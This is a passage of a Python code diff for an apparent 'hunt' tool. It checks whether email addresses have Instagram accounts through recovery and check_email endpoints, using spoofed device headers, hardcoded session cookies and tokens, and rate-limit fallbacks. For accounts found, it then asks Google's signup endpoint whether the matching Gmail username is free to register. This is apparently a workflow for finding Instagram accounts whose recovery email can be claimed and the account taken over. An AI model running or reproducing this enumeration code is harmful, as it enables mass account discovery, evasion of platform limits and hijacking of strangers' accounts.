+        "x-pigeon-session-id": ctx["session_id"],
+    }
+
+
+def _parse_mobile_check_email(body):
+    """i.instagram.com users/check_email — available:false = on IG."""
+    text = body or ""
+    low = text.lower()
+    if "rate limit" in low or "please wait" in low:
+        return None, "rate_limited"
+    try:
+        data = json.loads(text)
+    except (ValueError, TypeError):
+        return None, "unparsed"
+    if (data.get("status") or "").lower() == "fail":
+        msg = (data.get("message") or "").lower()
+        if "rate" in msg or "wait" in msg:
+            return None, "rate_limited"
+        return False, data.get("message") or "No account found"
+    if data.get("available") is False:
+        return True, "Account exists"
+    if (data.get("error_type") or "").lower() == "email_is_taken":
+        return True, "Account exists"
+    if data.get("allow_shared_email_registration") is True:
+        return True, "Account exists"
+    if data.get("available") is True:
+        return False, "No account found"
+    return None, "unparsed"
+
+
+def _parse_mobile_assisted_recovery(body):
+    """assisted_account_recovery — accounts list vs help center."""
+    text = body or ""
+    low = text.lower()
+    if "rate limit" in low or "please wait" in low:
+        return None, "rate_limited"
+    try:
+        data = json.loads(text)
+    except (ValueError, TypeError):
+        return None, "unparsed"
+    action = (data.get("action") or "").lower()
+    if action == "show_recovery_accounts_list" and (data.get("accounts") or []):
+        return True, "Account exists"
+    if action == "show_help_center_link":
+        return False, "No account found"
+    if (data.get("status") or "").lower() == "fail":
+        return None, "rate_limited"
+    return None, "unparsed"
+
+
+def _ig_lookup_mobile_check_email(email):
+    ctx = _hunt_ig_device_ctx()
+    data = {
+        "email": email,
+        "android_device_id": ctx["android"],
+        "login_nonce_map": "{}",
+        "login_nonces": "[]",
+        "qe_id": ctx["device"],
+        "waterfall_id": str(uuid.uuid4()),
+    }
+    response = _hunt_http_post(
+        _HUNT_MOBILE_CHECK_EMAIL_URL,
+        data=data,
+        headers=_hunt_mobile_headers(
+            ctx,
+            client_endpoint="users/check_email",
+            friendly_name="IgApi: users/check_email/",
+        ),
+        timeout=_hunt_lookup_timeout(),
+    )
+    code = int(getattr(response, "status_code", 0) or 0)
+    if code == 429:
+        return None, "rate_limited"
+    return _parse_mobile_check_email(response.text or "")
+
+
+def _ig_lookup_mobile_assisted_recovery(email):
+    ctx = _hunt_ig_device_ctx()
+    data = {
+        "query": email,
+        "source": "account_recovery",
+        "waterfall_id": str(uuid.uuid4()),
+    }
+    response = _hunt_http_post(
+        _HUNT_MOBILE_ASSISTED_RECOVERY_URL,
+        data=data,
+        headers=_hunt_mobile_headers(
+            ctx,
+            client_endpoint="accounts/assisted_account_recovery",
+            friendly_name="IgApi: accounts/assisted_account_recovery/",
+        ),
+        timeout=_hunt_lookup_timeout(),
+    )
+    code = int(getattr(response, "status_code", 0) or 0)
+    if code == 429:
+        return None, "rate_limited"
+    return _parse_mobile_assisted_recovery(response.text or "")
+
+
+def _ig_lookup_hunt_fast_check_email(email):
+    """Minimal check_email POST (T-LNX / xd style) — fastest IG probe on clean IP."""
+    try:
+        resp = _get_hunt_http_session().post(
+            _HUNT_MOBILE_CHECK_EMAIL_URL,
+            data={"email": email},
+            headers={
+                "User-Agent": _HUNT_CHECK_EMAIL_FAST_UA,
+                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+            },
+            timeout=_HUNT_CHECK_EMAIL_FAST_TIMEOUT,
+        )
+        code = int(getattr(resp, "status_code", 0) or 0)
+        if code == 429:
+            return None, "rate_limited"
+        status, msg = _parse_mobile_check_email(resp.text or "")
+        if status is not None:
+            return status, msg
+        return None, msg or "unparsed"
+    except Exception:
+        return None, "error"
+
+
+def ig_lookup_M3_hunt(email):
+    """Hunt IG — one mobile check_email; assisted only on 429; GQL if mobile RL."""
+    email = (email or "").strip().lower()
+    if not email or "@" not in email:
+        return False, "Empty query"
+    if _ig_in_lookup_block_cooldown():
+        return False, "rate_limited"
+    try:
+        status, msg = _ig_lookup_mobile_check_email(email)
+        if status is not None:
+            return status, msg or ("Account exists" if status else "No account found")
+        if msg != "rate_limited":
+            return False, msg or "No account found"
+        _mark_ig_lookup_blocked(cooldown=_IG_BLOCK_COOLDOWN_LOOKUP)
+        status, msg = _ig_lookup_mobile_assisted_recovery(email)
+        if status is not None:
+            return status, msg or ("Account exists" if status else "No account found")
+        gql_status, gql_msg = _ig_lookup_hunt_graphql_hunt(email)
+        if gql_status is True:
+            return True, gql_msg or "Account exists"
+        if gql_status is False and gql_msg != "rate_limited":
+            return False, gql_msg or "No account found"
+        return False, "rate_limited"
+    except Exception as exc:
+        return False, str(exc)[:120]
+
+
+def ig_lookup_M2_hunt(email):
+    """Legacy web M2 — kept for /ig_lookup_m2 tool; hunt uses M3 mobile."""
+    email = (email or "").strip().lower()
+    if not email or "@" not in email:
+        return False, "Empty query"
+    try:
+        return ig_lookup_M2(email)
+    except Exception as exc:
+        return False, str(exc)[:120]
+
+
+def _ig_lookup_hunt_graphql_hunt(email):
+    """Web recovery GraphQL — fast vs M1 bloks (~2s vs 10–30s)."""
+    email = (email or "").strip().lower()
+    if not email or "@" not in email:
+        return False, "Empty query"
+    try:
+        status, msg = ig_lookup_M2_hunt(email)
+    except Exception as exc:
+        return False, str(exc)[:120]
+    if status is True:
+        return True, msg or "Account exists"
+    if status is False:
+        return False, msg or "No account found"
+    if msg == "rate_limited":
+        return False, "rate_limited"
+    return False, msg or "No account found"
+
+
+def _hunt_ig_lookup_with_fallback(email):
+    """Hunt IG — GraphQL first (~2s); M1 bloks only when GraphQL rate-limited."""
+    email = (email or "").strip().lower()
+    if not email or "@" not in email:
+        return False, "Empty query"
+    try:
+        status, msg = _ig_lookup_hunt_graphql_hunt(email)
+        if status is True:
+            return True, msg or "Account exists"
+        if msg != "rate_limited":
+            return False, msg or "No account found"
+        if _ig_in_lookup_block_cooldown():
+            return False, "rate_limited"
+        _mark_ig_lookup_blocked(cooldown=_IG_BLOCK_COOLDOWN_LOOKUP)
+        m1_status, m1_msg = ig_lookup_M1_hunt(email)
+        if m1_status is True:
+            return True, m1_msg or "Account exists"
+        if m1_msg == "rate_limited":
+            return False, "rate_limited"
+        return False, m1_msg or msg or "No account found"
+    except Exception as exc:
+        return False, str(exc)[:120]
+
+
+def _hunt_lookup_gmail_pair(email):
+    """IG + Gmail in one thread hop — gmail uses check_gmail_hunt_cycle retries."""
+    try:
+        _gmail_token_parts(force_tl=False)
+    except Exception:
+        pass
+    ig_status, ig_msg = _hunt_ig_lookup_with_fallback(email)
+    valid = ig_status is True
+    hit = False
+    gmail_msg = None
+    if valid:
+        gmail_result = check_gmail_hunt_cycle(email)
+        print(gmail_result)
+        if isinstance(gmail_result, str):
+            gmail_msg = gmail_result
+        else:
+            gmail_status, gmail_msg = gmail_result
+            hit = gmail_status is True
+    return valid, hit, ig_msg, gmail_msg
+
+
+def ig_lookup_M1(email):
+    global goodig, badig
+    try:
+        return _ig_lookup_M1_impl(email, hunt_fast=False)
+    except Exception as exc:
+        return False, str(exc)[:120]
+
+
+def ig_lookup_M1_hunt(email):
+    """Hunt IG — M1 bloks stream (48KB miss cap) + reused device."""
+    email = (email or "").strip().lower()
+    if not email or "@" not in email:
+        return False, "Empty query"
+    if _ig_in_lookup_block_cooldown():
+        return False, "rate_limited"
+    try:
+        return _ig_lookup_M1_impl(email, hunt_fast=False, reuse_device=True)
+    except Exception as exc:
+        return False, str(exc)[:120]
+
+
+def _parse_hunt_ig_graphql_body(body, query):
+    """Return (True/False, msg) or (None, reason) to fall back to bloks."""
+    m2_status, m2_msg = _parse_hunt_ig_m2_body(body)
+    if m2_status is not None:
+        return m2_status, m2_msg
+    if m2_msg == "rate_limited":
+        return None, "rate_limited"
+    text = (body or "").strip()
+    if not text:
+        return None, "empty"
+    if text.startswith("for (;;);"):
+        text = text[9:].strip()
+    low = text.lower()
+    if "rate limit" in low:
+        return None, "rate_limited"
+    if _HUNT_IG_NO_ACCOUNT_RE.search(text):
+        return False, "No account found"
+    q = (query or "").strip()
+    if q and q in text:
+        return True, "Account exists"
+    try:
+        data = json.loads(text)
+        search = (data.get("data") or {}).get("caa_ar_ig_account_search") or {}
+        qlow = q.lower()
+        if "@" in qlow:
+            local, domain = qlow.split("@", 1)
+            for cp in search.get("contact_points") or []:
+                if not isinstance(cp, dict):
+                    continue
+                if (cp.get("type") or "").upper() != "EMAIL":
+                    continue
+                val = (cp.get("value") or cp.get("display") or "").lower()
+                if qlow in val or (f"@{domain}" in val and local and val.startswith(local[0])):
+                    return True, "Account exists"
+        elif search.get("contact_points") or search.get("user") or search.get("username"):
+            return True, "Account exists"
+    except (ValueError, TypeError, AttributeError):
+        pass
+    if '"error":' in text and "contact_points" not in text:
+        return None, "rate_limited"
+    return False, "No account found"
+
+
+def _ig_lookup_hunt_graphql(query):
+    """Fast hunt IG — web GraphQL with full email (user@gmail.com)."""
+    query = (query or "").strip().lower()
+    if not query:
+        return None, "empty"
+    csrf, lsd = load(force_refresh=False)
+    variables = json.dumps(
+        {
+            "params": {
+                "event_request_id": str(uuid.uuid4()),
+                "next_uri": "",
+                "search_query": query,
+                "waterfall_id": str(uuid.uuid4()),
+            }
+        },
+        separators=(",", ":"),
+    )
+    payload = {
+        "av": "0",
+        "__d": "www",
+        "__user": "0",
+        "__a": "1",
+        "__req": "8",
+        "dpr": "1",
+        "__ccg": "GOOD",
+        "__comet_req": "7",
+        "__crn": "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
+        "qpl_active_flow_ids": "516759801",
+        "fb_api_caller_class": "RelayModern",
+        "fb_api_req_friendly_name": "CAAIGAccountSearchViewQuery",
+        "server_timestamps": "true",
+        "doc_id": _HUNT_IG_GRAPHQL_DOC_ID,
+        "variables": variables,
+        "jazoest": str(random.randint(20000, 29999)),
+        "lsd": lsd,
+    }
+    headers = {
+        "User-Agent": _IG_WEB_UA,
+        "Accept": "*/*",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "X-CSRFToken": csrf,
+        "X-IG-App-ID": "936619743392459",
+        "X-FB-Friendly-Name": "CAAIGAccountSearchViewQuery",
+        "X-ASBD-ID": "359341",
+        "X-FB-LSD": lsd,
+        "Origin": "https://www.instagram.com",
+        "Referer": _HUNT_IG_RESET_URL,
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+    }
+    response = _hunt_http_post(
+        _HUNT_IG_GRAPHQL_URL,
+        data=payload,
+        headers=headers,
+        timeout=_hunt_lookup_timeout(),
+    )
+    if int(getattr(response, "status_code", 0) or 0) == 429:
+        return None, "rate_limited"
+    return _parse_hunt_ig_graphql_body(response.text or "", query)
+
+
+def _ig_lookup_M1_impl(email, *, hunt_fast=False, reuse_device=False):
+    url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
+    if hunt_fast or reuse_device:
+        ctx = _hunt_ig_device_ctx()
+        device = ctx["device"]
+        family = ctx["family"]
+        android = ctx["android"]
+        pigeon_session = ctx["session_id"]
+    else:
+        device = str(uuid.uuid4())
+        family = str(uuid.uuid4())
+        android = "android-" + secrets.token_hex(8)
+        pigeon_session = f"UFS-{uuid.uuid4()}-0"
+    payload = {
+      'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":"+ str(int(time.time())) +",\\\"aacjid\\\":\\\""+ str(uuid.uuid4()) +"\\\",\\\"aaccs\\\":\\\""+ secrets.token_urlsafe(32) +"\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\""+ email +"\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\""+ device +"\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\""+ str(uuid.uuid4()) +"\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\""+ android +"\",\"login_surface\":\"login_home\",\"waterfall_id\":\""+ str(uuid.uuid4()) +"\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\""+ family +"\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\""+ device +"\"}}",
+      'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
+      'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
+    }
+    headers = {
+      'User-Agent': "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
+      'accept-language': "en-IN, en-US",
+      'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
+      'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
+      'x-ig-android-id': android,
+      'x-ig-app-id': "567067343352427",
+      'x-ig-app-locale': "en_IN",
+      'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
+      'x-ig-device-id': device,
+      'x-ig-family-device-id': family,
+      'x-ig-timezone-offset': str(datetime.now().astimezone().utcoffset().total_seconds()),
+      'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
+      'x-pigeon-rawclienttime': str(time.time()),
+      'x-pigeon-session-id': pigeon_session,
+    }
+    if hunt_fast:
+        code, kind = _hunt_http_post_scan(
+            url,
+            data=payload,
+            headers=headers,
+            timeout=_hunt_lookup_timeout(),
+            hit_needle=email,
+        )
+        if kind == "hit":
+            return True, "Account exists"
+        if kind == "rate_limited":
+            return False, "rate_limited"
+        if kind == "miss":
+            return False, "No account found"
+        return False, "No account found"
+    response = _hunt_http_post(
+        url, data=payload, headers=headers, timeout=_hunt_lookup_timeout(),
+    )
+    resp = response.text or ""
+    if response.status_code == 429:
+        return False, "rate_limited"
+    low = resp.lower()
+    if "rate limit" in low or "please wait" in low:
+        return False, "rate_limited"
+    if f"{email}" in resp:
+        return True, "Account exists"
+    return False, "No account found"
+
+
+def ig_lookup_M2(email):
+    cookies = {
+        'csrftoken': 'emU-IV3KQqGoXhI1qJjrGQ',
+        'datr': 'BuUKag642s55rnsmRN_YcqyI',
+        'ig_did': '019B020F-E14E-436D-B058-F28A1941DCFE',
+        'mid': 'agrlBgAEAAG-8qSlB3Bci8eyshI_',
+        'dpr': '1.0909090909090908',
+        'wd': '1709x924',
+    }
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0',
+        'Accept': '*/*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'X-FB-Friendly-Name': 'CAAIGAccountSearchViewQuery',
+        'X-CSRFToken': 'emU-IV3KQqGoXhI1qJjrGQ',
+        'X-IG-App-ID': '936619743392459',
+        'X-IG-Max-Touch-Points': '0',
+        'X-FB-LSD': 'AdQe6dvzIXZbagGy49WvtiSBSAQ',
+        'X-ASBD-ID': '359341',
+        'Origin': 'https://www.instagram.com',
+        'Connection': 'keep-alive',
+        'Referer': 'https://www.instagram.com/accounts/password/reset/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'Priority': 'u=0',
+        'Pragma': 'no-cache',
+        'Cache-Control': 'no-cache',
+    }
+
+    data = {
+        'av': '0',
+        '__d': 'www',
+        '__user': '0',
+        '__a': '1',
+        '__req': '1e',
+        '__hs': '20591.HYP:instagram_web_pkg.2.1...0',
+        'dpr': '1',
+        '__ccg': 'EXCELLENT',
+        '__rev': '1039692732',
+        '__s': 'w7u6pd:wnn185:1w292y',
+        '__hsi': '7641171533661006458',
+        '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e2C1vzEdEc8co2qwJxS0k24o0B-q7oc81EE2Cwwwqo6ucw5Mx612xO1ywOwv89k2C1FwnE6a0D85m1mzXwae4UaEW2G0AEco5G1HxidU5O3y785C7U620g62Z2oS1TwVwDwHg2ZwrVocobGwmk0zU8oC1IwGw-wlAcwBwUQp1yU426V8aUuwm8bU5q0EoK9x60ma1XwiE884O0XEdoC',
+        '__csr': 'gZ0wNQ8ghp2SOOhn5GJllikQHlKRdkWFtbQQXYyj8BSy9Xqd99pcZh5ZFT8hYOb8hWl8IFOh4G-B8WyrGjvTK58C9CoFV8iOkKidUnppHAmGGU_BhpAu9-ivyppGVUxa9LBBKmA9gzmbiGil1649a-VrhEyidAy8gx2AEy8xWEf6dwywDGium2-6bUkUtK7p8epbz9qwxxaUiwBxy2J3E8-2e2K01psw040Pz8mG0geu8g3Hyo0DXw2Xo6oE8U0kDwkE2qo23xnw5RwZw2v80A4wqA9e0Nba9w3C9Uy2e0kS1-gbe1zAUfo18hgx0rja5E3_w3mEbU-01ggw',
+        '__hsdp': 'n0_BOtGFB2qI8B8u9hk99aAdwq8S0yFohxGWdDKqaydF10IA49O0xht0vXrxCawdl8w44a9xa0CV42e2q2e07w81mo0cG80DLw6Ew2l80pHw5Bw',
+        '__hblp': '06cw8Gm4oa8bodofoqwgpUcUlxx0alzoO0C830xWi1gz830wfC0Feewpo5m56685O581po3PQqU3Hwb60FU16U7K0ju0ia0fGw3t83hxydwn8jwv8665o1EoS0mS0hfwQwr8nBwvE0IS0qG1CAyEy2m0DU9E25w4fwlo20U6K',
+        '__sjsp': 'n0_BOtGFB25aNAxi7ykl2iiF3o6ydw8Gm4oqKzpXCyEzokb912sw8kng7-SUpyE3li8112yoiw9Kh0zwCwzw',
+        '__comet_req': '7',
+        'lsd': 'AdQe6dvzIXZbagGy49WvtiSBSAQ',
+        'jazoest': '22395',
+        '__spin_r': '1039692732',
+        '__spin_b': 'trunk',
+        '__spin_t': '1779098886',
+        '__crn': 'comet.igweb.PolarisCAAIGAccountRecoverySearchRoute',
+        'qpl_active_flow_ids': '516759801',
+        'fb_api_caller_class': 'RelayModern',
+        'fb_api_req_friendly_name': 'CAAIGAccountSearchViewQuery',
+        'server_timestamps': 'true',
+        'variables': json.dumps({
+            'params': {
+                'event_request_id': 'c4b3117e-d1d3-4a9d-b3e4-cfa57a405c9d',
+                'next_uri': '',
+                'search_query': email,
+                'waterfall_id': 'ecf54a6e-8a3a-4c3c-b79b-9be736a0a9a7'
+            }
+        }),
+        'doc_id': '35299094813070532',
+        'fb_api_analytics_tags': '["qpl_active_flow_ids=516759801"]',
+    }
+
+    response = _hunt_http_post(
+        "https://www.instagram.com/api/graphql",
+        cookies=cookies,
+        headers=headers,
+        data=data,
+        timeout=_hunt_lookup_timeout(),
+    )
+    m2_status, m2_msg = _parse_hunt_ig_m2_body(response.text or "")
+    if m2_status is True:
+        return True, m2_msg or "Account exists"
+    if m2_status is False:
+        return False, m2_msg or "No account found"
+    return False, "Api got dead? if continously same error then contact owner :("
+
+
+task_queue = queue.Queue()
+
+
+def _write_gmail_token_atomic(line):
+    tmp_path = f"{TOKEN_FILE}.tmp"
+    with open(tmp_path, "w", encoding="utf-8") as f:
+        f.write(line)
+    os.replace(tmp_path, TOKEN_FILE)
+
+
+def _gmail_invalidate_token_cache() -> None:
+    with _gmail_tl_cond:
+        _gmail_tl_cache["at"] = 0.0
+
+
+def _gmail_tl_cache_fresh() -> bool:
+    with _gmail_tl_cond:
+        return _gmail_tl_cache_fresh_unlocked()
+
+
+def _gmail_force_refresh_tl() -> None:
+    """Invalidate + fetch new TL — all waiters block until refresh finishes."""
+    _gmail_invalidate_token_cache()
+    try:
+        get_TL(force=True)
+    except Exception:
+        pass
+
+
+def _start_gmail_token_maintainer() -> None:
+    """Refresh TL in background before expiry — keeps mass hunt gmail stable."""
+    global _gmail_maintainer_started
+    if _gmail_maintainer_started:
+        return
+    _gmail_maintainer_started = True
+
+    def _loop() -> None:
+        while True:
+            time.sleep(max(45, GMAIL_TL_CACHE_SEC - GMAIL_TL_REFRESH_EARLY_SEC))
+            try:
+                get_TL(force=True)
+            except Exception:
+                pass
+
+    threading.Thread(target=_loop, name="gmail-tl-maintainer", daemon=True).start()
+
+
+def get_TL(*, force=False):
+    global _gmail_tl_refreshing
+    with _gmail_tl_cond:
+        if not force and _gmail_tl_cache_fresh_unlocked():
+            return
+        while _gmail_tl_refreshing:
+            _gmail_tl_cond.wait(timeout=28.0)
+            if not force and _gmail_tl_cache_fresh_unlocked():
+                return
+        _gmail_tl_refreshing = True
+    try:
+        _fetch_gmail_tl_locked(force=force)
+    except Exception:
+        if not force:
+            try:
+                _fetch_gmail_tl_locked(force=True)
+            except Exception:
+                pass
+    finally:
+        with _gmail_tl_cond:
+            _gmail_tl_refreshing = False
+            _gmail_tl_cond.notify_all()
+
+
+def _gmail_tl_cache_fresh_unlocked() -> bool:
+    """Caller must hold _gmail_tl_cond."""
+    cached = _gmail_tl_cache.get("payload")
+    at = float(_gmail_tl_cache.get("at") or 0)
+    return isinstance(cached, str) and "//" in cached and time.time() - at < GMAIL_TL_CACHE_SEC
+
+
+def _fetch_gmail_tl_locked(*, force=False):
+    try:
+        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
+        n1 = ''.join(random.choice(alphabet) for _ in range(random.randrange(6, 9)))
+        n2 = ''.join(random.choice(alphabet) for _ in range(random.randrange(3, 9)))
+        host = ''.join(random.choice(alphabet) for _ in range(random.randrange(15, 30)))
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
+            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
+            'google-accounts-xsrf': '1',
+            USER_AGENT_HEADER: str(generate_user_agent())
+        }
+        recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
+                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
+        res1 = _google_accounts_request(
+            "GET", recovery_url, headers=headers, timeout=HUNT_LOOKUP_TIMEOUT,
+        )
+        setup_match = re.search(r'data-initial-setup-data="(%.@\.[^"]*)"', res1.text)
+        if not setup_match:
+            raise ValueError("Unable to find data-initial-setup-data in Google response")
+        setup_data = html.unescape(setup_match.group(1))
+        tok_match = re.search(
+            r'%.@\.null,null,null,null,null,null,null,null,null,"[^"]*",null,null,null,"([^"]*)"',
+            setup_data
+        )
+        if not tok_match:
+            raise ValueError("Unable to parse signup token from data-initial-setup-data")
+        tok = tok_match.group(1)
+        cookies = {'__Host-GAPS': host}
+        headers2 = {
+            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
+            'google-accounts-xsrf': '1',
+            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
+            REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
+                              '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
+            USER_AGENT_HEADER: generate_user_agent()
+        }
+        data = {
+            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
+            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
+                           'null,0,1,"",null,null,2,2]')
+        }
+        response = _google_accounts_request(
+            "POST",
+            f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
+            cookies=cookies,
+            headers=headers2,
+            data=data,
+            timeout=HUNT_LOOKUP_TIMEOUT,
+        )
+        token_line = str(response.text).split('",null,"')[1].split('"')[0]
+        host = response.cookies.get_dict()['__Host-GAPS']
+        line = f"{token_line}//{host}\n"
+        _write_gmail_token_atomic(line)
+        with _gmail_tl_cond:
+            _gmail_tl_cache["payload"] = line
+            _gmail_tl_cache["at"] = time.time()
+    except Exception:
+        raise
+
+
+def _gmail_token_parts(*, force_tl: bool = False):
+    get_TL(force=force_tl)
+    with _gmail_tl_cond:
+        cached = _gmail_tl_cache.get("payload")
+        at = float(_gmail_tl_cache.get("at") or 0)
+        if (
+            not force_tl
+            and isinstance(cached, str)
+            and "//" in cached
+            and time.time() - at < GMAIL_TL_CACHE_SEC
+        ):
+            token_data = cached.strip()
+        else:
+            try:
+                with open(TOKEN_FILE, "r", encoding="utf-8") as f:
+                    token_data = f.read().splitlines()[0]
+            except (OSError, IndexError):
+                return None
+    if "//" not in token_data:
+        return None
+    tl, host = token_data.split("//", 1)
+    return tl, host
+
+
+def _parse_gmail_uar_response(text: str, *, raw_text: str = "") -> tuple[bool, str] | None:
+    """Return (free, msg) or None if unparseable."""
+    body = text or ""
+    if body.startswith(")]}'"):
+        body = body[4:]
+    try:
+        parsed = json.loads(body)
+    except json.JSONDecodeError:
+        parsed = None
+    if isinstance(parsed, list):
+        for item in parsed:
+            if isinstance(item, list) and len(item) >= 2 and item[0] == "gf.uar":
+                code = item[1]
+                message = item[-1] if len(item) >= 5 else ""
+                if code == 1:
+                    return True, "Gmail account doesn't exist"
+                if code == 2:
+                    return False, "Gmail account exists"
+                if code == 3:
+                    return False, "Invalid Gmail username"
+                return False, f"Gmail account unknown status {code}: {message}"
+    raw = raw_text or text or ""
+    if '"gf.uar",1' in raw or '"gf.uar", 1' in raw:
+        return True, "Gmail account doesn't exist"
+    if '"gf.uar",2' in raw or '"gf.uar", 2' in raw:
+        return False, "Gmail account exists"
+    if '"gf.uar",3' in raw or '"gf.uar", 3' in raw:
+        return False, "Invalid Gmail username"
+    return None
+
+
+def _gmail_lookup_once(email: str, *, force_tl: bool = False, hunt_fast: bool = False) -> tuple[bool, str] | str:
+    if "@" in email:
+        email = email.split("@")[0]
+    if len(email) < 6 or len(email) > 30:
+        return False, "Invalid Gmail username length (must be 6-30 characters)"
+    parts = _gmail_token_parts(force_tl=force_tl)
+    if not parts:
+        return "gmail_error -> missing google_token (get_TL failed)"
+    tl, host = parts
+    cookies = {"__Host-GAPS": host}
+    headers = {
+        AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
+        "accept": "*/*",
+        "accept-language": "en-US,en;q=0.9",
+        CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
+        "google-accounts-xsrf": "1",
+        ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
+        REFERRER_HEADER: (
+            "https://accounts.google.com/signup/v2/createusername?service=mail"
+            f"&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}"
+        ),
+        USER_AGENT_HEADER: _gmail_lookup_user_agent(),
+    }
+    params = {"TL": tl}
+    data = (
+        f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
+        f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
+        "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
+        "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
+        "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
+        "&gmscoreversion=undefined&flowName=GlifWebSignIn&"
+    )
+    post_url = f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability"
+    try:
+        if hunt_fast:
+            response = _hunt_http_post(
+                post_url,
+                data=data,
+                headers=headers,
+                timeout=_hunt_lookup_timeout(),
+                cookies=cookies,
+                params=params,
+            )
+        else:
+            response = _get_hunt_http_session().post(
+                post_url,
+                params=params,
+                cookies=cookies,
+                headers=headers,
+                data=data,
+                timeout=HUNT_LOOKUP_TIMEOUT,
+            )
+    except requests.RequestException as exc:
+        return "gmail_error -> network"
+    if response.status_code in (429, 502, 503, 504):
+        return "gmail_error -> google_busy"
+    text = response.text or ""
+    parsed = _parse_gmail_uar_response(text, raw_text=text)
+    if parsed is not None:
+        return parsed
+    return False, "gmail_parse_failed"
+
+
+def _gmail_lookup_retry_core(email, *, max_attempts, hunt_fast_prefer: bool = True):
+    """
+    On any parse/network/token error: refresh TL immediately, wait, retry.
+    Parallel hunt workers share one refresh — others block until new TL is ready.
+    """
+    if hunt_fast_prefer:
+        strategies = (
+            (False, True),
+            (True, True),
+            (True, False),
+            (True, True),
+            (True, True),
+        )
+    else:
+        strategies = (
+            (False, False),
+            (True, False),
+            (True, False),
+            (True, False),
+        )
+    strategies = strategies[:max_attempts]
+    last_msg = "gmail_parse_failed"
+    for attempt, (force_tl, use_fast) in enumerate(strategies):
+        if attempt:
